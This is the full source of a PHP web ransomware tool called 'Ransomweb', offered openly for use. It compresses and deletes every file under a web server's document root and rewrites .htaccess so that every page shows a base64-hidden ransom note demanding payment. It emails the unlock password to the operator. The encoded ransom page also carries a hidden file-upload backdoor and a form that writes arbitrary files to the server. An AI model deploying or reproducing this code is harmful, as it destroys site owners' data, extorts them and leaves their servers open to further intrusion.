<!DOCTYPE html>
<html>
<head>
	<meta name="theme-color" content="#1A1C1F">
   <title>Ransomweb</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border:1px solid aqua;
    background-color: transparent;
    color: yellow;
    width: 200px;
    height: 20px;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: yellow;
    background-color: transparent;
    width: 90px;
    color: gold;
}
.submite{
       background-color: black;
	color: cyan;
	border: 1.2px dotten gold;
	width: 100px;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<center>
<font color="white">Mail Function :</font><?php if(mail('yangrecodemudahanmati@gmail.com','mantod ganteng','mantod ganteng')) { echo "<font color='aqua'>ON</font>"; } else { echo "<font color='red'>OFF</font>"; } ?>
</font><br></pre>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.locked') !== false) {
    return;
	}
	file_put_contents($filename.".locked", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
$file = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAia250bCI7DQppZihpc3NldCgkaW5wdXQpKSB7DQppZihtZDUoJGlucHV0KSA9PSAkcGFzcykgew0KZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpew0KCWlmIChzdHJwb3MoJGZpbGVuYW1lLCAnLmxvY2tlZCcpID09PSBGQUxTRSkgew0KCXJldHVybjsNCgl9DQoJJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsNCglmaWxlX3B1dF9jb250ZW50cyhzdHJfcmVwbGFjZSgnLmxvY2tlZCcsICcnLCAkZmlsZW5hbWUpLCAkZGVjcnlwdGVkKTsNCnVubGluaygndW5sb2NrLnBocCcpOw0KCXVubGluaygkZmlsZW5hbWUpOw0KCWVjaG8gJzx0aXRsZT5MT0NLRUQgQlkgU05JUEVSNDA0PC90aXRsZT48Ym9keSBiZ2NvbG9yPSMxQTFDMUY+PGkgY2xhc3M9ImZhIGZhLXVubG9jayIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPGZvbnQgY29sb3I9IiNGRkVCM0IiPlVubG9jazwvZm9udD4gKDxmb250IGNvbG9yPSIjNDBDRTA4Ij5TdWNjZXNzPC9mb250PikgPGZvbnQgY29sb3I9IiMwMEZGRkYiPj0+PC9mb250PiA8Zm9udCBjb2xvcj0iIzIxOTZGMyI+Jy4kZmlsZW5hbWUuJzwvZm9udD4gPGJyPic7DQp9DQoNCmZ1bmN0aW9uIGRlY2RpcigkZGlyKXsNCgkkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOw0KCQlmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgew0KCQkJaWYoaXNfZGlyKCRkaXIuIi8iLiRmaWxlKSl7DQoJCQkJZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsNCgkJCX1lbHNlIHsNCgkJCQlkZWNmaWxlKCRkaXIuIi8iLiRmaWxlKTsNCgkJfQ0KCX0NCn0NCg0KZGVjZGlyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pOw0KZWNobyAnPGZvbnQgY29sb3I9ImxpbWUiPjxicj5EZWNyeXB0ZWQ8YnI+JzsNCnVubGluaygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7DQplY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+c3VjZXNzICEhISc7DQp9IGVsc2Ugew0KZWNobyAnPHRpdGxlPkxPQ0tFRCBCWSBTTklQRVI0MDQ8L3RpdGxlPg0KPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNjYzEwMTciPg0KPGJvZHkgYmdjb2xvcj0jMUExQzFGPg0KPGZvbnQgY29sb3I9InJlZCIgc2l6ZT0iMjAiPldyb25nIFBhc3N3b3JkICEhITwvZm9udD48L2k+DQo8L3ByZT4nOw0KfQ0KZXhpdCgpOw0KfQ0KPz4NCjxodG1sPg0KCTxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1JY2VsYW5kJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1NZXJpZW5kYScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9VWJ1bnR1JyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1TaGFkb3dzK0ludG8rTGlnaHQnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPjxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvcG5nIiBocmVmPSJodHRwczovL2kuaWJiLmNvL21oR2NmMHEvRDcwNFQuanBnIi8+PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9mb250LWF3ZXNvbWUvNC42LjMvY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4NCjxoZWFkPg0KPHRpdGxlPkxPQ0tFRCBCWSBTTklQRVI0MDQ8L3RpdGxlPjwvaGVhZD4NCjxzdHlsZT4NCmJvZHkgew0KYmFja2dyb3VuZDogIzAwMDAwMDA7DQogICBiYWNrZ3JvdW5kLWltYWdlOnVybChodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU25pcGVyeHh4L3dlYi9tYWluL21lbWVxdWUuanApOyBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7fQ0Kew0KLXdlYmtpdC1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIC1tb3otYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DQogICAtby1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIGJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KfQ0KLm10ew0KICAgIGJvcmRlcjoxLjJweCBzb2xpZCBhcXVhOw0KICAgIGJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0KICAgIGNvbG9yOiBsaW1lOw0KICAgIHdpZHRoOiAyMDBweDsNCiAgICBoZWlnaHQ6IDI1cHg7DQogICAgZm9udC1mYW1pbHk6IFVidW50dTsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQouYnRjYWRkcmVzc3sNCiAgICBib3JkZXI6MC44cHggc29saWQgd2hpdGU7DQogICAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsNCiAgICBjb2xvcjogd2hpdGU7DQogICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgIHdpZHRoOiA0MDBweDsNCiAgICBoZWlnaHQ6IDI2cHg7DQogICAgZm9udC1zaXplOiAxNzsNCiAgICBmb250LWZhbWlseTogVWJ1bnR1Ow0KfQ0KLmVtYWlsew0KICAgIGJvcmRlcjowcHg7DQogICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7DQogICAgdGV4dC1hbGlnbjogY2VudGVyOyANCiAgICBjb2xvcjogYXF1YTsNCiAgICB3aWR0aDogMzEwcHg7DQogICAgaGVpZ2h0OiAzMHB4Ow0KICAgIGZvbnQtc2l6ZTogMjguNTsNCiAgICBmb250LWZhbWlseTogSWNlbGFuZDsNCn0NCnBsYWNlaG9sZGVyew0KCWNvbG9yOiB3aGl0ZTsNCn0NCi5nYXN7DQoJYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7DQoJY29sb3I6IHdoaXRlOw0KCWJvcmRlcjogMS4ycHggc29saWQgd2hpdGU7DQoJd2lkdGg6IDcwcHg7DQp9DQo8L3N0eWxlPg0KPGNlbnRlcj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxmb250Pg0KPHNwYW4gc3R5bGU9ImZvbnQ6IDQwcHggTWVyaWVuZGE7Y29sb3I6d2hpdGU7Ij5Zb3VyIFdlYnNpdGUgSGFzIGJlZW4gRW5jcnlwdA0KPGhyIHdpZHRoPSI5MCUiPjxzcGFuIHN0eWxlPSdmb250OiAxMHB4IGljZWxhbmQ7Y29sb3I6d2hpdGU7dGV4dC1zaGFkb3c6IDBweCAwcHggMXB4Oyc+fCBQYXltZW50IEFkZHJlc3MgfDxicj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImJ0Y2FkZHJlc3MiIHZhbHVlPSJwYXltZW50eiIgcmVhZG9ubHk+PGJyPg0KPHNwYW4gc3R5bGU9J2ZvbnQ6IDI1cHggaWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAzcHg7Jz5NYWtlIGEgcGF5bWVudCBvciBJIGRlc3Ryb3kgeW91ciB3ZWJzaXRlIGFuZCBpdCB3aWxsIG5vdCByZXR1cm4gdG8gbm9ybWFsLCBieSBtYWtpbmcgYSBwYXltZW50IEkgd2lsbCBnaXZlIHlvdSBhIHBhc3N3b3JkIGFuZCB5b3VyIHdlYnNpdGUgd2lsbCByZXR1cm4gdG8gbm9ybWFsIDopDQo8YnI+PGJyPg0KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXNzIiBjbGFzcz0ibXQiIHBsYWNlaG9sZGVyPSJFbnRlciB5b3VyIGRlY3J5cHRpb24ga2V5Ij4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJnYXMiIHZhbHVlPSJVTkxPQ0siPg0KPC9mb3JtPg0KPGJyPjxicj4NCjxib2R5IGJnY29sb3I9YmxhY2s+PHRkIGFsaWduPWNlbnRlcj4NCjxicj4NCgk8c3BhbiBzdHlsZT0nZm9udDogOC41cHggSWNlbGFuZDtjb2xvcjphcXVhO3RleHQtc2hhZG93OiAwcHggMHB4IDJweDsnPjxDb250YWN0IE1lPg0KPGJyPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZW1haWwiIHZhbHVlPSIiIHJlYWRvbmx5Pjxicj4NCjwvaHRtbD4NCjw/cGhwDQpzZXRfdGltZV9saW1pdCgwKTsNCmVycm9yX3JlcG9ydGluZygwKTsNCmVycm9yX2xvZygwKTsNCmlmKGlzc2V0KCRfR0VUWyI/Il0pKXsNCg0KZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdGVUNLJz4NCjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1RPRCcgdmFsdWU9J1VQTE9BRCc+DQo8L2Zvcm0+PGJyPjxicj4iOw0KDQokU05JUEVSNDA0ID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsNCiRHSE9TVCA9ICRfRklMRVNbJ0ZVQ0snXVsnbmFtZSddOw0KJEFOSklSID0gJFNOSVBFUjQwNC4nLycuJEdIT1NUOw0KaWYoaXNzZXQoJF9QT1NUWydUT0QnXSkpIHsNCmlmKGlzX3dyaXRhYmxlKCRTTklQRVI0MDQpKSB7DQppZihAY29weSgkX0ZJTEVTWydGVUNLJ11bJ3RtcF9uYW1lJ10sICRBTkpJUikpIHsNCiRYUExPSVQgPSAiaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIvIjsNCmVjaG8gIlN1a3NlcyBtYXMgOikgPGEgaHJlZj0nJFhQTE9JVC8kR0hPU1QnIHRhcmdldD0nX2JsYW5rJz4kWFBMT0lULyRHSE9TVDwvYT4iOw0KfSBlbHNlIHsNCmVjaG8gIkdhZ2FsIG1hcyA6KCI7DQp9DQp9IGVsc2Ugew0KaWYoQGNvcHkoJF9GSUxFU1snRlVDSyddWyd0bXBfbmFtZSddLCAkR0hPU1QpKSB7DQplY2hvICJTdWtzZXMgZGkgZm9sZGVyIGluaSBtYXMiOw0KfSBlbHNlIHsNCmVjaG8gIiI7DQp9DQp9DQp9DQoNCmlmICghaXNzZXQoJF9QT1NUWyJwbGVycnIiXSkpIHsNCmVjaG8gIjxmb3JtIG1ldGhvZD0nUE9TVCc+DQo8YnI+PGNlbnRlcj5CWVBBU1MgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2ZuYW1lJyBzaXplPScnPjxicj48YnIgLz4gPHRleHRhcmVhIGNvbHM9JzMwJyByb3dzPScxNScgbmFtZT0nZmNvZGUnPjwvdGV4dGFyZWE+PGJyPjxiciAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3BsZXJycicgdmFsdWU9J0JZUEFTUyc+IDwvZm9ybT48L2NlbnRlcj4iOw0KICANCn0gZWxzZSB7ICRmbmFtZSA9ICRfUE9TVFsiZm5hbWUiXTsgJGZjb2RlID0gJF9QT1NUWyJmY29kZSJdOyBmd3JpdGUoZm9wZW4oJGZuYW1lLCAidyIpLCAkZmNvZGUpOyANCn0NCn0NCj8+");
$q = str_replace('kntl', md5($_POST['pass']), $file);
$w = str_replace('djoatmail', $_POST['email'], $q);
$e = str_replace('paymentz', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('unlock.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "#Ransomware
DirectoryIndex unlock.php\n
ErrorDocument 403 /unlock.php\n
ErrorDocument 404 /unlock.php\n
ErrorDocument 500 /unlock.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('djoat.php', $_SERVER['DOCUMENT_ROOT'].'/unlock.php');
$memec = $_POST['email'];
$cyna = 'Ransomware Info';
$ngentot = "Domain : ".$_SERVER['SERVER_NAME'];
$skuy = "Password : ".$_POST['pass'];
$zegarr = "$ngentot \n $skuy";
if(mail($memec,$cyna,$zegarr)) {
echo '<font color="lime"><b>Password Saved, Check your Email</b></font>';
} else {
echo '<font color="red"><b>No Mail</b></font>';
}
exit();
}
?>
	<pre>
<h2><center><font color=white>Encryption Key</h2></font></pre></center>
<form action="" method="post" style=" text-align: center;">
<font color="aqua">
<label>PASS : </label>
<input type="text" name="pass" class="inpute" placeholder="make a password">
      <select name="method" class="selecte">
         <option value="kontolbapakkau">LOCK</option>
      </select><pre><br>
<label>Your Email : </label>
<input type="text" name="email" class="inpute">
<label>Your Payment Address : </label>
<input type="text" name="btc" class="inpute">
<input type="submit" name="submit" class="submite" value="Submit" />
</form>
</div>
</body>
</html>
